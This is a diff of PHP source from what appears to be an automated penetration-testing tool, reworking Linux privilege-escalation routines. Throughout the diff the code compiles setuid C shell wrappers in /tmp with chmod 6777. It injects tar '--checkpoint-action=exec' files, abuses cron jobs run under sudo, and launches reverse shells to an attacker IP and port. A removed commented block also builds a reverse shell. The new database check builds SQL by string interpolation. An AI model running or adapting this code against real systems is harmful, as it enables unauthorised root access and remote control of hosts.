@@ -338,10 +338,14 @@ This can also be used to determine local IPs, as well as gain a better understan
         
     }
     
-    public function lan2pentest8id($template_id_euid,$attacker_ip,$attacker_port,$shell){
+    public function lan2pentest8id($template_id_euid){
         // echo id | sshpass -p 'password' ssh user@10.60.10.131 -p 22 -C  "/tmp/seteuid_user_user2_bash \"/tmp/seteuid_user2_user3_bash \\\"/tmp/seteuid_user3_root_bash \"/bin/bash\" \\\" \" "
         
         $this->titre(__FUNCTION__);
+        $attacker_ip = $this->ip4addr4target($this->ip);
+        $attacker_port = rand(1024,65535);
+        $shell = "/bin/bash";
+        
         if ($this->ip2root8db($this->ip2id)) return $this->log2succes("IP already rooted",__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");
         if (!strstr($template_id_euid, "%ID%")) return $this->log2error("There is NO %ID% into Template:$template_id_euid",__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");
         $template_id = $template_id_euid;
@@ -354,8 +358,6 @@ This can also be used to determine local IPs, as well as gain a better understan
         
         $id = "id";
         $cmd_id = str_replace("%ID%", $id, $template_id);
-        //$rst_id = $this->stream4result($this->stream,$cmd_id,$this->stream_timeout*3);
-
         $rst_id = $this->lan2stream4result($cmd_id,$this->stream_timeout*3);
         //var_dump($rst_id);
         
@@ -366,9 +368,9 @@ This can also be used to determine local IPs, as well as gain a better understan
             $rst_id = $this->lan2stream4result($data,$this->stream_timeout);
         }
         
-        list($uid,$uid_name,$gid,$gid_name,$euid,$euid_name,$egid,$egid_name,$groups,$context,$id) = $this->parse4id($rst_id);
+        list($uid,$uid_name,$gid,$gid_name,$euid,$euid_name,$egid,$egid_name,$groups,$context,$id8str) = $this->parse4id($rst_id);
         
-        $id8b64 = base64_encode($id);
+        $id8b64 = base64_encode($id8str);
         if (!empty($uid_name) ){
             
             if ( (empty($euid_name)) && ($uid_name !== $this->uid_name) ){
@@ -377,17 +379,12 @@ This can also be used to determine local IPs, as well as gain a better understan
                 $template_cmd2 = str_replace("%SHELL%",addcslashes($template_id,'"'),$this->template_shell);
                 $template_cmd = str_replace("%ID%","%CMD%",$template_cmd2);
                 $templateB64_cmd = base64_encode($template_cmd);
-                
-                //$data = str_replace("%ID%", $shell, $template_id);
-                //fputs($this->stream, $data);
-                //$template_id = "%ID%";
+
                 
                 $templateB64_id = base64_encode($template_id);
                 $this->article("CREATE Template ID", $template_id);
-                //$this->article("CREATE Template BASE64 ID", $templateB64_id);
                 $this->article("CREATE Template CMD", $template_cmd);
-                //$this->article("CREATE Template BASE64 CMD",$templateB64_cmd);
-                //fgets(STDIN);
+
                 $this->pause();
                 
                 $obj_lan_root1 = new check4linux($this->eth,$this->domain,$this->ip,$this->port,$this->protocol, $this->stream,$templateB64_id,$templateB64_cmd,$this->templateB64_shell,$id8b64);
@@ -398,13 +395,27 @@ This can also be used to determine local IPs, as well as gain a better understan
             if (!empty($euid_name)){
                 $this->rouge("try to spawn $euid_name ");$this->pause();
                 
-                $template_id_new = $this->lan2spawn2shell8euid($template_id);$this->pause();
+                $template_id_new = $this->lan2spawn2shell8euid($template_id,$euid_name);$this->pause();
+                
                 
                 $cmd_id = str_replace("%ID%", $id, $template_id_new);
                 $rst_id = $this->lan2stream4result($cmd_id,$this->stream_timeout);
-                list($uid,$uid_name,$gid,$gid_name,$euid,$euid_name,$egid,$egid_name,$groups,$context,$id) = $this->parse4id($rst_id);
-                $id8b64 = base64_encode($id);
+                list($uid,$uid_name,$gid,$gid_name,$euid,$euid_name,$egid,$egid_name,$groups,$context,$id8str) = $this->parse4id($rst_id);
+                $id8b64 = base64_encode($id8str);
                 
+                $templateB64_id_check = base64_encode($id8b64);
+                if ($this->lan2check4id8db($this->port2idt, $templateB64_id_check, $id8b64)){
+                    $chaine = "Escalation already done";
+                    $this->log2error($chaine,__FILE__,__CLASS__,__FUNCTION__,__LINE__,"","");
+                    $this->rouge("out from ".__FUNCTION__);$this->pause();
+                    return 0 ;
+                }
+                else {
+                    $chaine = "Escalation launching again";
+                    $this->log2succes($chaine,__FILE__,__CLASS__,__FUNCTION__,__LINE__,"","");
+                    $this->pause();
+                }
+                    
                 $template_id = $template_id_new;
                 $templateB64_id = base64_encode($template_id);
                 
@@ -416,15 +427,11 @@ This can also be used to determine local IPs, as well as gain a better understan
                 $templateB64_cmd = base64_encode($template_cmd);
                 
                 $this->article("OLD Template ID", $this->template_id);
-                //$this->article("NEW Template ID", $template_id);
                 $this->article("OLD Template CMD", $this->template_cmd);
-                //$this->article("NEW Template CMD", $template_cmd);
+
                 $obj_lan_root = new check4linux($this->eth,$this->domain,$this->ip,$this->port,$this->protocol, $this->stream,$templateB64_id,$templateB64_cmd,$this->templateB64_shell,$id8b64);
                 $obj_lan_root->poc($this->flag_poc);
-                $this->article("Template ID", $obj_lan_root->template_id);
-                //$this->article("Template BASE64 ID", $obj_lan_root->templateB64_id);
-                $this->article("Template CMD", $obj_lan_root->template_cmd);
-                //$this->article("Template BASE64 CMD",$obj_lan_root->templateB64_cmd);
+
                 $this->pause();
 
             if ($this->uid_name !== $obj_lan_root->uid_name){   
@@ -439,7 +446,7 @@ This can also be used to determine local IPs, as well as gain a better understan
                 $cmd_id = str_replace("%ID%", $id, $obj_lan_root->template_id);$this->pause();
 
                 
-                if ($this->lan2root4check8id($cmd_id,$obj_lan_root->templateB64_id)) {
+                if ($obj_lan_root->uid_name==="root" ) {
                     $this->log2succes("Yes RooT running infos",__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");
                     
                     $obj_lan_root->lan2check8id($attacker_ip,$attacker_port,$shell);$this->pause();
@@ -449,17 +456,6 @@ This can also be used to determine local IPs, as well as gain a better understan
                     
                     $this->log2succes("$obj_lan_root->uid_name is not root checking again",__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");
                     $obj_lan_root->lan2check8id($attacker_ip,$attacker_port,$shell);$this->pause();
-                    /*
-                    $attacker_ip = $this->ip4addr4target($this->ip);
-                    $attacker_port = rand(1024,65535);                    
-                    $shell = "/bin/bash";
-                    $nc = $this->rev8sh($attacker_ip, $attacker_port, $shell);
-                    $cmd_nc = str_replace("%ID%", $nc, $template_id);
-                    */
-                    
-                    //$obj_lan_root->lan4root();
-                    
-                    //$obj_lan_root->lan2pentest($attacker_port, $templateB64_id, $cmd_nc, $this->stream_timeout*1000);$this->pause();
                 }
                 
             }
@@ -480,9 +476,14 @@ This can also be used to determine local IPs, as well as gain a better understan
     }
     
     
-    public function lan2spawn2shell8euid($template_id){
+    public function lan2spawn2shell8euid($template_id,$euid_name){
         $this->ssTitre(__FUNCTION__);
         $result = "";
+        $euid_name = trim($euid_name);
+        
+        if ($euid_name==="root") $homeuser = "/root";
+        else $homeuser = "/home/$euid_name";
+        
         $cmd_id = str_replace("%ID%", "id", $template_id);
         
         
@@ -495,6 +496,7 @@ This can also be used to determine local IPs, as well as gain a better understan
 #include <stdio.h>
 #include <sys/types.h>
 #include <unistd.h>
+#include <stdlib.h>
 int main(void){
 setuid(0);
 setgid(0);
@@ -507,32 +509,43 @@ EOC;
 #include <stdio.h>
 #include <sys/types.h>
 #include <unistd.h>
+#include <stdlib.h>
 int main(void){
+printf("Before uid:%d euid:%d gid:%d egid:%d\\n",getuid(),geteuid(),getgid(),getegid());
 setreuid(geteuid(),getuid());
 setregid(getegid(),getgid());
+printf("After uid:%d euid:%d gid:%d egid:%d\\n",getuid(),geteuid(),getgid(),getegid());
 system("/bin/bash -c id");
 return 0;
 }
 EOC;
           
             
-
-            $query = "echo '$seteuid' > /tmp/seteuid_id_$this->uid_name.c";
+            $elf = new bin4linux("/tmp/seteuid_id_$euid_name");
+            $query = "echo '$seteuid' > $elf->file_path.c  ";
             $this->lan2stream4result($query,$this->stream_timeout);
-            $query = "gcc -o /tmp/seteuid_id_$this->uid_name /tmp/seteuid_id_$this->uid_name.c && chmod 6777 /tmp/seteuid_id_$this->uid_name ";
-            $data = str_replace("%ID%","$query", $template_id);
-            $this->lan2stream4result($data,$this->stream_timeout);
-            $data = str_replace("%ID%", "/tmp/seteuid_id_$this->uid_name", $template_id);
+            $query = "ls -al $elf->file_path.c ";
+            $this->lan2stream4result($query,$this->stream_timeout);
+            $data = "bash -p -c 'gcc -o $elf->file_path $elf->file_path.c && chmod 6777 $elf->file_path'";
+            $data2 = str_replace("%ID%",$data, $template_id);
+            $this->lan2stream4result($data2,$this->stream_timeout);
+            $data = "ls -al $homeuser ";
+            $this->lan2stream4result($query,$this->stream_timeout);
+            $data = str_replace("%ID%","$elf->file_path", $template_id);
             $rst_id = $this->lan2stream4result($data,$this->stream_timeout);
              
-            list($uid_found,$username_found,$gid_found,$groupname_found,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id) = $test->parse4id($rst_id);
+            list($uid_found,$username_found,$gid_found,$groupname_found,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id) = $this->parse4id($rst_id);
             $id8b64 = base64_encode($id);
             
             
             if ( !empty($username_found) ){
                 
-                $chaine = "Try to Spawn USER:$username_found via USER:$this->uid_name";
+                $chaine = "Try to Spawn USER:$euid_name via USER:$this->uid_name";
                 $this->note($chaine);
+                
+                
+                
+                
                 $this->article("username found", $username_found);
  
                 $this->article("username now", $this->uid_name);
@@ -547,6 +560,7 @@ EOC;
 #include <stdio.h>
 #include <sys/types.h>
 #include <unistd.h>
+#include <stdlib.h>
 int main(int argc, char **argv){
 setreuid(geteuid(),getuid());
 setregid(getegid(),getgid());
@@ -555,34 +569,28 @@ execl("/bin/bash","bash","-c",argv[1], NULL);
 return 0;
 }
 EOC;
-                   // execl("/bin/sh","sh","-c","$cmd_nc", NULL);
-                    // execve("/bin/bash",["/bin/bash", NULL], NULL);
-                    // system("cp /bin/bash /tmp/bash_$this->uid_name && chmod 6777 /tmp/bash_$this->uid_name");
-                    $file_bash_name = "/tmp/shell_$username_found";
-                    $tmp = "echo '$seteuid' > $file_bash_name.c ";
-                    //$data = str_replace("%ID%", $tmp, $template_id);
-                    $this->lan2stream4result($tmp,$this->stream_timeout);
-                    $query = "gcc -o $file_bash_name $file_bash_name.c && chmod 6777 $file_bash_name";
-                    $data = str_replace("%ID%","\"$query\"", $template_id);
-                    $this->lan2stream4result($data,$this->stream_timeout);
-                    $data = "ls -al /tmp/";
-                    $this->lan2stream4result($data,$this->stream_timeout);
-                    $data = "ls -al $file_bash_name";
-                    $this->lan2stream4result($data,$this->stream_timeout);
-                    $this->pause();
-
-                    
-                    $data = "$file_bash_name id";
+                    $elf = new bin4linux("/tmp/shell_id_$euid_name");
+                    $query = "echo '$seteuid' > $elf->file_path.c  ";
+                    $this->lan2stream4result($query,$this->stream_timeout);
+                    $query = "ls -al $elf->file_path.c ";
+                    $this->lan2stream4result($query,$this->stream_timeout);
+                    $data = "bash -p -c 'gcc -o $elf->file_path $elf->file_path.c && chmod 6777 $elf->file_path'";
+                    $data2 = str_replace("%ID%",$data, $template_id);
+                    $this->lan2stream4result($data2,$this->stream_timeout);
+                    $data = "ls -al $homeuser ";
+                    $this->lan2stream4result($query,$this->stream_timeout);
+                    $data = str_replace("%ID%","$elf->file_path id", $template_id);
                     $rst_id = $this->lan2stream4result($data,$this->stream_timeout);
+                    
                     list($new_uid_found,$new_username_found,$new_gid_found,$new_groupname_found,$new_euid,$new_username_euid,$new_egid,$new_groupname_egid,$new_groups,$context,$id8b64) = $this->parse4id($rst_id);
                     
                     
                     if ( !empty($new_username_found) ){
-                        if ( $new_username_found===$username_found ){
-                            $chaine = "Succes Spawn $username_found";
+                        if ( $new_username_found===$euid_name ){
+                            $chaine = "Succes Spawn $euid_name";
                             $this->log2succes($chaine,__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");
                             
-                            $new_templateB64_id = "$file_bash_name %ID%";
+                            $new_templateB64_id = "$elf->file_path '%ID%' ";
                             $this->article("New TEMPLATE B64", $new_templateB64_id);
                             $this->pause();
                             return $new_templateB64_id;
@@ -590,55 +598,9 @@ EOC;
                     }
                     
                     
-
-                    
-
-                    
-                    /*
-                    
-                                        $shell = "/bin/sh";
-                    $attacker_ip = $this->ip4addr4target($this->ip);
-                    $attacker_port = rand(1024,65535);
-                    $attacker_port = 7777;
-                    $shell = "/bin/bash";
-                    $cmd = $this->rev8sh($attacker_ip, $attacker_port, $shell);
-                    
-                    $seteuid = <<<EOC
-#include <stdio.h>
-#include <sys/types.h>
-#include <unistd.h>
-int main(void){
-setreuid(geteuid(),getuid());
-setregid(getegid(),getgid());
-system(\\\"/bin/bash -c \'$cmd\' \\\");
-return 0;
-}
-EOC;
-                    $tmp = "echo \"$seteuid\" > /tmp/seteuid_rev_$this->uid_name.c && gcc -o /tmp/seteuid_rev_$this->uid_name /tmp/seteuid_rev_$this->uid_name.c && chmod 6755 /tmp/seteuid_rev_$this->uid_name && chmod +s /tmp/seteuid_rev_$this->uid_name";
-                    $this->lan2stream4result($tmp,$this->stream_timeout);
-                    //$data = str_replace("%ID%", $tmp, $template_id);
-
-                    
-                    
-                    
-                    $data = "ls -al /tmp/seteuid_rev_$this->uid_name";
-                    $this->lan2stream4result($data,$this->stream_timeout);
-                    $data = str_replace("%ID%", "/tmp/seteuid_rev_$this->uid_name", $template_id); 
-                    //$this->lan2stream4result($data,$this->stream_timeout);
-                    //$template_cmd = str_replace("%ID%", "%CMD%", $template_id);
-                    //$infos_base64 = base64_encode($template_cmd);
-                    //$time2wait = $this->stream_timeout*20;
-                    //$this->lan2pentest($attacker_port, $infos_base64, $data, $time2wait);
-              */
-                    
-                    
-
-                    
-                    //$this->lan2pentest8id($template_id_euid,$attacker_ip,$attacker_port,$shell);
-                    
                 }
                 else {
-                    $chaine = "NOT spawned USER:$this->uid_name to USER:$username_found ";
+                    $chaine = "NOT spawned USER:$this->uid_name to USER:$euid_name ";
                     $this->rouge($chaine);$this->pause();
                     
                 }
@@ -832,17 +794,16 @@ EOC;
                 $this->lan2stream4result($data,$this->stream_timeout);
                 $data = "/tmp/$hashname -p -c id";
                 $rst_id = $this->lan2stream4result($data,$this->stream_timeout);
+                list($uid,$uid_name,$gid,$gid_name,$euid,$euid_name,$egid,$egid_name,$groups,$context,$id8str) = $this->parse4id($rst_id);
+                
                 $this->pause();
                 if (strstr($rst_id, "euid=")) {
                     $template_id = "/tmp/$hashname -p -c %ID%";
                     $templateB64_id = base64_encode($template_id);
-                    $template_id_new = $this->lan2spawn2shell8euid($template_id);
+                    $template_id_new = $this->lan2spawn2shell8euid($template_id,$euid_name);
                     
-                    $attacker_ip = $this->ip4addr4target($this->ip);
-                    $attacker_port = rand(1024,65535);
-                    //$attacker_port = 7777;
-                    $shell = "/bin/bash";
-                    $this->lan2pentest8id($template_id_new,$attacker_ip,$attacker_port,$shell);
+
+                    $this->lan2pentest8id($template_id_new);
                     
                 }
                 
@@ -868,11 +829,8 @@ EOC;
         if (!empty($check_tar)){
             $sha1_hash = sha1($obj_jobs->file_path);
             $template_id_test = "echo  \"%ID%\" > /tmp/$sha1_hash.sh && echo \"\" > \"--checkpoint-action=exec=sh /tmp/$sha1_hash.sh\" && echo \"\" > --checkpoint=1";
-            $attacker_ip = $this->ip4addr4target($this->ip);
-            $attacker_port = rand(1024,65535);
-            //$attacker_port = 7777;
-            $shell = "/bin/bash";
-            $this->lan2pentest8id($template_id_test,$attacker_ip,$attacker_port,$shell);
+ 
+            $this->lan2pentest8id($template_id_test);
             $this->pause();
         }
     }
@@ -892,11 +850,8 @@ EOC;
             //sleep($minute*60);
             if (!$this->ip2root8db($this->ip2id)){
             $template_id_test = "echo '%ID%' > $obj_jobs->file_path && sudo -u $username $obj_jobs->file_path";
-            $attacker_ip = $this->ip4addr4target($this->ip);
-            $attacker_port = rand(1024,65535);
-            //$attacker_port = 7777;
-            $shell = "/bin/bash";
-            $this->lan2pentest8id($template_id_test,$attacker_ip,$attacker_port,$shell);
+
+            $this->lan2pentest8id($template_id_test);
             $this->pause();
             }
         }
@@ -932,7 +887,7 @@ EOC;
         $attacker_port = rand(1024,65535);
         //$attacker_port = 7777;
         $shell = "/bin/bash";
-        $this->lan2pentest8id($template_id_test,$attacker_ip,$attacker_port,$shell);
+        $this->lan2pentest8id($template_id_test);
         $this->pause();
         $data = "rm -v /tmp/$sha1_hash ";
         $this->lan2stream4result($data,$this->stream_timeout);
@@ -1043,36 +998,11 @@ EOC;
     
 
 
-public function lan2root4check8id($data,$infos_base64){
-    $this->ssTitre(__FUNCTION__);
-    $data = trim($data);
-
-    $impass = "must be run from a terminal";
-    if (empty($data)){
-        $this->log2error("Empty DATA",__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");       
-        return FALSE;
+    public function lan2check4id8db($id8port,$templateB64_id,$id8b64):bool{
+        $sql_w = "SELECT id8port,templateB64_id,id8b64 FROM LAN WHERE id8port = $id8port AND templateB64_id = '$templateB64_id' AND id8b64 = '$id8b64' ";
+        echo "mysql --user=$this->mysql_login --password=$this->mysql_passwd --database=$this->mysql_database --execute=\"SELECT EXISTS($sql_w);\"  2>/dev/null \n";
+        return $this->checkBD($sql_w);
     }
-    $check = $this->lan2stream4result($data,$this->stream_timeout*2.5);
-    //var_dump($check);
-    if (stristr($check,$impass)){
-        //$this->notify("$this->ip:$this->port:$this->protocol:$impass:$data:$infos");
-        $this->log2error($impass,__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");
-        
-        return FALSE;
-    }
-    if(strstr($check, "uid=0(root)")){
-        $this->port2root($infos_base64);
-        return TRUE;
-    }
-    else {
-        $this->note("Not Rooted");
-        return FALSE;
-    }
-    
-}
-
-
-
 
 
 public function lan2check8id($attacker_ip, $attacker_port, $shell){
@@ -1116,6 +1046,11 @@ public function lan2check8id($attacker_ip, $attacker_port, $shell){
     
     $cmd1 = "php pentest.php LAN \"$this->eth $this->domain $this->ip $this->port $this->protocol $attacker_port $lprotocol $this->templateB64_cmd $this->templateB64_shell server 60 listening_Server\" ";
     $cmd2 = str_replace("%ID%","/tmp/$hash_cmd_rev.sh",$this->template_id);
+    $cmd3 = str_replace("%SHELL%","/tmp/$hash_cmd_rev.sh",$this->template_shell);
+    
+    $this->exec_parallel($cmd1, $cmd3, $this->stream_timeout);
+    /*
+    return 0;
     
     $query1 = "xterm -T '$cmd1' -e '$cmd1' 2> /dev/null ";
 
@@ -1129,7 +1064,7 @@ public function lan2check8id($attacker_ip, $attacker_port, $shell){
         echo "\t\033[36;40;1;1m 2:\033[0m \033[37;40;1;1m $cmd2 \033[0m\n";
         $this->stream4result($this->stream,$cmd2, $this->stream_timeout*5);
     }
-    
+    */
     $this->pause();
 }
 
